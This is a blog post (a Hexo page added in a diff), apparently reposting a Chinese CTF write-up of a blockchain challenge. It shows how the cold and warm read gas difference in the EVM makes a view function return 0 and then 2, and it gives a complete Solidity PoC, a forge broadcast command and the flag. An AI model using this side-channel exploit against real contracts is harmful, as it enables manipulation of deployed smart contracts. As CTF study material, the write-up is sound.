@@ -1,0 +1,211 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>封神台CTF blockchain 美梦成真 | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="EVM 冷读&#x2F;热读 gas 差异作为侧信道让 view 函数在不同调用返回不同值，绕过 wish_making 校验。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="封神台CTF blockchain 美梦成真">
+<meta property="og:url" content="https://pudong617.github.io/2025/01/01/ctf-kb/wp/Misc/%E5%B0%81%E7%A5%9E%E5%8F%B0CTF_blockchain_%E7%BE%8E%E6%A2%A6%E6%88%90%E7%9C%9F/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="EVM 冷读&#x2F;热读 gas 差异作为侧信道让 view 函数在不同调用返回不同值，绕过 wish_making 校验。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2024-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="blockchain">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2025/01/01/ctf-kb/wp/Misc/%E5%B0%81%E7%A5%9E%E5%8F%B0CTF_blockchain_%E7%BE%8E%E6%A2%A6%E6%88%90%E7%9C%9F/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '封神台CTF blockchain 美梦成真',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">封神台CTF blockchain 美梦成真</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-12-31T16:00:00.000Z" title="发表于 2025-01-01 00:00:00">2025-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-12-31T16:00:00.000Z" title="更新于 2025-01-01 00:00:00">2025-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Misc/">Misc</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="封神台CTF blockchain 美梦成真"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/222685.html">https://www.ctfiot.com/222685.html</a><br>ID: 222685</p>
+</blockquote>
+<p>招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱</p>
+<p><a href="mailto:&#x61;&#100;&#109;&#105;&#x6e;&#x40;&#99;&#104;&#97;&#x6d;&#x64;&#x35;&#46;&#111;&#x72;&#x67;">&#x61;&#100;&#109;&#105;&#x6e;&#x40;&#99;&#104;&#97;&#x6d;&#x64;&#x35;&#46;&#111;&#x72;&#x67;</a>(带上简历和想加入的小组)</p>
+<p>分析：这道题的合约放在了 Sepolia 测试网上，要进行交互，首先要调用 start_challenge()函数，有点像是使用 EOA 账户来开启容器的味道了。</p>
+<p>要想 is_solved 函数返回 true 这里要求我们 EOA 对应的wishes mapping的值大于 1。要想修改 wishes 只能通过wish_making函数。调用该函数时会自动调用msg.sender上的wish_amount函数。</p>
+<p>function wish_making() external challenge_started remains_wish {<br> Wish_Maker wish_maker &#x3D; Wish_Maker(msg.sender);<br> bool is_less_than &#x3D; false;<br> if (wish_maker.wish_amount() &lt; 1) {<br> is_less_than &#x3D; true;<br> }<br> wish_made[tx.origin] &#x3D; true;<br> if (is_less_than) {<br> wishes[tx.origin] &#x3D; wish_maker.wish_amount();<br> } else {<br> wishes[tx.origin]–;<br> }<br>}</p>
+<p>要想满足 is_solved 的条件，我们需要当 target 第一次调用我们攻击合约的 wish_amount 时，第一次返回的是 0，第二次返回的值大于 1。但是，由于接口的定义，wish_amount函数是一个 view 函数。通过常规的方法无法修改，但是我们可以利用 evm 冷读热的的特点进行绕过</p>
+<p>当第一次访问一个地址时，这个地址是冷读，消耗的 gas 为 2600，但是第二次访问这个地址时，就变成了热读，消耗的 gas 仅有 100。所以我们可以对攻击合约中的 wish_amount 函数进行如下构造：</p>
+<p>function wish_amount() external view returns (uint256) {<br>    uint256 startGas &#x3D; gasleft();<br>    uint256 bal &#x3D; address(0x100).balance;<br>    uint256 usedGas &#x3D; startGas - gasleft();<br>    if (usedGas &lt; 1000) {<br> return 2;<br>    }<br>    return 0;<br>}</p>
+<p>完整 Poc</p>
+<p>pragma solidity ^0.8.0;</p>
+<p>import {Script} from “forge-std&#x2F;Script.sol”;<br>import {Make_a_wish} from “..&#x2F;src&#x2F;Make_a_wish.sol”;<br>import {Wish_Maker} from “..&#x2F;src&#x2F;Make_a_wish.sol”;</p>
+<p>contract Poc is Wish_Maker {<br> function wish_amount() external view returns (uint256) {<br> uint256 startGas &#x3D; gasleft();<br> uint256 bal &#x3D; address(0x100).balance;<br> uint256 usedGas &#x3D; startGas - gasleft();<br> if (usedGas &lt; 1000) {<br> return 2;<br> }<br> return 0;<br> }</p>
+<p> function attack() external {<br> Make_a_wish target &#x3D; Make_a_wish(0xFD8fa72956172C671cA3cc5c84f38f0C98CEEa61);<br> target.start_challenge();<br> target.wish_making();<br> require(target.is_solved(address(tx.origin)), “hack failed”);<br> }<br>}</p>
+<p>contract Attack is Script {<br> function run() public {<br> vm.startBroadcast();<br> Poc poc &#x3D; new Poc();<br> poc.attack();<br> vm.stopBroadcast();<br> }<br>}</p>
+<p>执行 foundry 命令即可：</p>
+<p>forge script script&#x2F;Attack.s.sol –rpc-url $rpc –private-key $key –tc Attack –broadcast –evm-version cancun</p>
+<p>account：0xDf996e6b09A5f1dc4da8365148e7e8D52e8fD892</p>
+<p>flag：flag{v1ew_K3yword_7rouble}</p>
+<p>结束</p>
+<p>招新小广告</p>
+<p>ChaMd5 Venom 招收大佬入圈</p>
+<p>新成立组IOT+工控+样本分析 长期招新</p>
+<p>欢迎联系<a href="mailto:&#x61;&#x64;&#109;&#105;&#110;&#64;&#99;&#104;&#x61;&#x6d;&#x64;&#53;&#x2e;&#111;&#114;&#103;">&#x61;&#x64;&#109;&#105;&#110;&#64;&#99;&#104;&#x61;&#x6d;&#x64;&#53;&#x2e;&#111;&#114;&#103;</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">function wish_making() external challenge_started remains_wish &#123;</span><br><span class="line"> Wish_Maker wish_maker = Wish_Maker(msg.sender);</span><br><span class="line"> bool is_less_than = false;</span><br><span class="line"> if (wish_maker.wish_amount() &lt; 1) &#123;</span><br><span class="line"> is_less_than = true;</span><br><span class="line"> &#125;</span><br><span class="line"> wish_made[tx.origin] = true;</span><br><span class="line"> if (is_less_than) &#123;</span><br><span class="line"> wishes[tx.origin] = wish_maker.wish_amount();</span><br><span class="line"> &#125; else &#123;</span><br><span class="line"> wishes[tx.origin]--;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">function wish_amount() external view returns (uint256) &#123;</span><br><span class="line">	uint256 startGas = gasleft();</span><br><span class="line">	uint256 bal = address(0x100).balance;</span><br><span class="line">	uint256 usedGas = startGas - gasleft();</span><br><span class="line">	if (usedGas &lt; 1000) &#123;</span><br><span class="line"> return 2;</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &#123;Script&#125; from &quot;forge-std/Script.sol&quot;;</span><br><span class="line">import &#123;Make_a_wish&#125; from &quot;../src/Make_a_wish.sol&quot;;</span><br><span class="line">import &#123;Wish_Maker&#125; from &quot;../src/Make_a_wish.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Poc is Wish_Maker &#123;</span><br><span class="line"> function wish_amount() external view returns (uint256) &#123;</span><br><span class="line"> uint256 startGas = gasleft();</span><br><span class="line"> uint256 bal = address(0x100).balance;</span><br><span class="line"> uint256 usedGas = startGas - gasleft();</span><br><span class="line"> if (usedGas &lt; 1000) &#123;</span><br><span class="line"> return 2;</span><br><span class="line"> &#125;</span><br><span class="line"> return 0;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> function attack() external &#123;</span><br><span class="line"> Make_a_wish target = Make_a_wish(0xFD8fa72956172C671cA3cc5c84f38f0C98CEEa61);</span><br><span class="line"> target.start_challenge();</span><br><span class="line"> target.wish_making();</span><br><span class="line"> require(target.is_solved(address(tx.origin)), &quot;hack failed&quot;);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack is Script &#123;</span><br><span class="line"> function run() public &#123;</span><br><span class="line"> vm.startBroadcast();</span><br><span class="line"> Poc poc = new Poc();</span><br><span class="line"> poc.attack();</span><br><span class="line"> vm.stopBroadcast();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">forge script script/Attack.s.sol --rpc-url $rpc --private-key $key --tc Attack --broadcast --evm-version cancun</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h2 id="附图"><a href="#附图" class="headerlink" title="附图"></a>附图</h2><p>[图片已移除]<br>[图片已移除]<br>[图片已移除]</p>
+<hr>
+<blockquote>
+<p><strong>转载声明</strong>：本文转载自 <a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge">Des-CTF-Knowledge</a>（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。<br>原文链接：<a target="_blank" rel="noopener" href="https://www.ctfiot.com/222685.html">https://www.ctfiot.com/222685.html</a><br>仓库原文：<a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/%E5%B0%81%E7%A5%9E%E5%8F%B0CTF_blockchain_%E7%BE%8E%E6%A2%A6%E6%88%90%E7%9C%9F.full.md">CTF大赛WP集合&#x2F;articles&#x2F;封神台CTF_blockchain_美梦成真.full.md</a></p>
+</blockquote>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/blockchain/">blockchain</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/01/01/ctf-kb/wp/Misc/%E5%A4%A9%E5%B1%B1%E5%9B%BA%E7%BD%91-2025%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B-WriteUp/" title="天山固网 2025 网络安全技能竞赛 - 5题WP(MISC+CRYPTO+REVERSE)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">天山固网 2025 网络安全技能竞赛 - 5题WP(MISC+CRYPTO+REVERSE)</div></div></a></div><div class="next-post pull-right"><a href="/2025/01/01/ctf-kb/wp/Misc/%E5%B1%B1%E4%B8%9C%E7%9C%81-%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81-%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-%E9%93%B8%E7%BD%912025-%E5%B1%B1%E4%B8%9C%E7%9C%81%E5%B7%A5%E4%B8%9A%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91CTF%E7%AB%9E%E8%B5%9BWriteUp/" title="山东省技能兴鲁职业技能大赛—铸网 2025 工业和互联网 CTF WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">山东省技能兴鲁职业技能大赛—铸网 2025 工业和互联网 CTF WriteUp</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/01/01/ctf-kb/wp/Crypto/Paradigm_CTF_2021-Lockbox/" title="Paradigm CTF 2021 - Lockbox"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-01</div><div class="title">Paradigm CTF 2021 - Lockbox</div></div></a></div><div><a href="/2022/01/01/ctf-kb/wp/Web/Capture_The_Flag_-_CODEGATE_2022_Finals_Blockchain_Challenge_Look_It_Up_Writeup/" title="Capture The Flag – CODEGATE 2022 Finals Blockchain Challenge Look It Up Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-01</div><div class="title">Capture The Flag – CODEGATE 2022 Finals Blockchain Challenge Look It Up Writeup</div></div></a></div><div><a href="/2024/01/01/ctf-kb/wp/Web/HITCON_CTF_2024_Web3_writeup_by_ChaMd5/" title="HITCON CTF 2024 Web3 writeup by ChaMd5"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-01</div><div class="title">HITCON CTF 2024 Web3 writeup by ChaMd5</div></div></a></div><div><a href="/2022/01/01/ctf-kb/wp/Web/paradigm_2022_ctf_-Rescue/" title="paradigm 2022 ctf — Rescue"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-01</div><div class="title">paradigm 2022 ctf — Rescue</div></div></a></div><div><a href="/2025/01/01/ctf-kb/wp/Web/bi0sCTF_2025_Writeup_by_r3kapig/" title="bi0sCTF 2025 Writeup by r3kapig"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-01</div><div class="title">bi0sCTF 2025 Writeup by r3kapig</div></div></a></div><div><a href="/2023/01/01/ctf-kb/wp/Web/real_world_ctf_2023_HappyFactory_and_realwrap/" title="real world ctf 2023 HappyFactory and realwrap"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-01</div><div class="title">real world ctf 2023 HappyFactory and realwrap</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%9B%BE"><span class="toc-number">1.</span> <span class="toc-text">附图</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div 